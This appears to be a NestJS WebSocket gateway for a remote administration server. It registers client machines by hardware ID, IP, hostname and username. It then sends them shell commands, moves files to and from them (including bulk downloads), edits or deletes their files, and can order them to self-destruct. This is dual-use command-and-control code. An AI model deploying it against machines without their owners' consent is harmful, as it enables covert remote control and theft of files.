import {
  OnGatewayConnection,
  OnGatewayDisconnect,
  OnGatewayInit,
  SubscribeMessage,
  WebSocketGateway,
  WebSocketServer,
} from '@nestjs/websockets';
import { Server, Socket } from 'socket.io';
import { Client } from './entities/client.entity';
import { ClientService } from './client.service';
import { ConflictException, forwardRef, Inject } from '@nestjs/common';
import * as path from 'path';
import * as fs from 'fs';
import * as fse from 'fs-extra';

const allowedOrigins = ['http://localhost:3000'];

const corsOptions = {
  origin: (origin, callback) => {
    if (allowedOrigins.indexOf(origin) !== -1 || !origin) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  optionsSuccessStatus: 200,
};

@WebSocketGateway({ cors: corsOptions, maxHttpBufferSize: 2e9 })
export class ClientGateway
  implements OnGatewayInit, OnGatewayConnection, OnGatewayDisconnect
{
  @WebSocketServer()
  server: Server;

  private clients: Map<string, Socket> = new Map();
  constructor(
    @Inject(forwardRef(() => ClientService))
    private clientService: ClientService,
  ) {}

  afterInit() {
    console.log('WebSocket Server initialized');
  }

  handleConnection(client: Socket) {
    console.log('Client connected:', client.id);
  }

  handleDisconnect(client: Socket) {
    console.log(`Client disconnected: ${client.id}`);

    let disconnectedClientHwid: string | undefined;
    this.clients.forEach((value, key) => {
      if (value.id === client.id) {
        disconnectedClientHwid = key;
      }
    });

    if (disconnectedClientHwid) {
      this.server.emit('updateClientStatus', {
        hwid: disconnectedClientHwid,
        online: false,
      });
      this.clientService.updateClientStatus(disconnectedClientHwid, false);

      this.clients.delete(disconnectedClientHwid);
      console.log(
        `Client with hwid ${disconnectedClientHwid} removed from clients map.`,
      );
    } else {
      console.log('Client not found in clients map.');
    }
  }

  //Main functions

  @SubscribeMessage('register')
  async handleRegister(client: Socket, data: Client) {
    console.log(`Received register event:`, data);

    if (this.clients.has(data.hwid)) {
      console.log(`Client ${data.hwid} already registered`);
      return;
    }

    if (
      !data ||
      !data.hwid ||
      !data.ip ||
      !data.os ||
      !data.hostname ||
      !data.username ||
      !data.online ||
      !data.clientKey
    ) {
      console.error('Invalid register data:', data);
      return;
    }

    try {
      const registeredClient = await this.clientService.registerClient(data);

      if (!registeredClient) {
        client.emit('registrationFailed', {
          message:
            'Client registration failed. The client limit has been reached.',
        });
        return;
      }
      this.server.emit('updateClientStatus', { hwid: data.hwid, online: true });

      this.clients.set(data.hwid, client);
      console.log(
        `Client ${data.hwid} registered with socket ID: ${client.id}`,
      );
    } catch (error) {
      console.error('Error while registering client:', error);
    }
  }

  destroyConnection(hwid: string) {
    const clientSocket = this.clients.get(hwid);
    if (clientSocket) {
      clientSocket.emit('destroy');
      clientSocket.disconnect();
      this.clients.delete(hwid);
    } else {
      throw new ConflictException('Client not connected');
    }
  }

  restartClient(hwid: string) {
  const clientSocket = this.clients.get(hwid);
  if (!clientSocket) throw new ConflictException('Client not connected');

  clientSocket.emit('restart');
  }
  
  sendCommandToClient(
    client: Client,
    command: string,
    callback: (response: string) => void,
  ) {
    const clientSocket = this.clients.get(client.hwid);

    if (!clientSocket) throw new ConflictException('Client not connected');

    clientSocket.once('commandResponse', (data) => {
      callback(data);
    });

    clientSocket.emit('sendCommand', command);
  }

  uploadFileToClient(client: Client, filename: string, destination: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    const filePath = path.join(this.clientService.uploadPath, filename);
    const fileBuffer = fs.readFileSync(filePath);

    return new Promise((resolve, reject) => {
      clientSocket.emit('receiveFile', { filename, fileBuffer, destination });
      clientSocket.once('receiveFileResponse', async (data) => {
        if (data.status) {
          try {
            resolve(data);
          } catch (error) {
            reject(
              new ConflictException('Failed to save file after receiving.'),
            );
          }
        } else {
          if (data.message.includes('Destination')) {
            reject(new ConflictException(data.message));
          } else {
            reject(new ConflictException('There was an error while uploading'));
          }
        }
      });
    });
  }

  downloadFileFromClient(client: Client, filePath: string, filename: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    return new Promise<Buffer>((resolve, reject) => {
      clientSocket.emit('requestFile', { filePath, filename });
      clientSocket.once('requestFileResponse', async (data) => {
        if (data.status && data.fileBuffer) {
          try {
            await fse.ensureDir(this.clientService.downloadPath);

            const saveFilename =
              filename === '*'
                ? this.clientService.massDownloadZipName
                : filename;
            const saveFilePath = path.join(
              this.clientService.downloadPath,
              saveFilename,
            );

            //Check if the file is bigger than the max file size
            if (
              data.fileBuffer.length >
              this.clientService.maxFileUploadSize(client.hwid)
            ) {
              reject(new ConflictException('File is too large.'));
              return;
            }

            fs.writeFileSync(saveFilePath, data.fileBuffer);
            resolve(data.fileBuffer);
          } catch (error) {
            reject(
              new ConflictException('Failed to save file after receiving.'),
            );
          }
        } else {
          reject(new ConflictException('File not found or other error'));
        }
      });
    });
  }

  createFile(client: Client, filePath: string, content: string, type: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    return new Promise((resolve, reject) => {
      clientSocket.emit('createFile', { filePath, content, type });
      clientSocket.once('createFileResponse', async (data) => {
        if (data.status) {
          try {
            resolve(data);
          } catch (error) {
            reject(
              new ConflictException('Failed to save file after receiving.'),
            );
          }
        } else {
          reject(new ConflictException(data.message || 'Something went wrong'));
        }
      });
    });
  }

  readFile(client: Client, filePath: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    return new Promise((resolve, reject) => {
      clientSocket.emit('readFile', { filePath });
      clientSocket.once('readFileResponse', async (data) => {
        if (data.status && data.content) {
          try {
            const buffer = Buffer.from(data.content, 'base64');

            const content = buffer.toString('base64');
            const fileType = filePath.split('.').pop().toLowerCase();

            resolve({ content: content, fileType: fileType });
          } catch (error) {
            reject(new ConflictException('Failed to read file.'));
          }
        } else {
          reject(new ConflictException('File not found or other error'));
        }
      });
    });
  }

  updateFile(client: Client, filePath: string, content: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    return new Promise((resolve, reject) => {
      clientSocket.emit('updateFile', { filePath, content });
      clientSocket.once('updateFileResponse', async (data) => {
        if (data.status) {
          try {
            resolve(data);
          } catch (error) {
            reject(
              new ConflictException('Failed to save file after receiving.'),
            );
          }
        } else {
          reject(
            new ConflictException('There was an error while updating file'),
          );
        }
      });
    });
  }

  deleteFile(client: Client, filePath: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    return new Promise((resolve, reject) => {
      clientSocket.emit('deleteFile', { filePath });
      clientSocket.once('deleteFileResponse', async (data) => {
        if (data.status) {
          try {
            resolve(data);
          } catch (error) {
            reject(
              new ConflictException('Failed to save file after receiving.'),
            );
          }
        } else {
          reject(
            new ConflictException('There was an error while deleting file'),
          );
        }
      });
    });
  }

  getFileTree(client: Client, path: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    return new Promise((resolve, reject) => {
      clientSocket.emit('getFileTree', { path });
      clientSocket.once('getFileTreeResponse', async (data) => {
        if (data.status && data.fileTree) {
          try {
            resolve(data.fileTree);
          } catch (error) {
            reject(new ConflictException('Failed to read file tree.'));
          }
        } else {
          reject(new ConflictException('File tree not found or other error'));
        }
      });
    });
  }
}
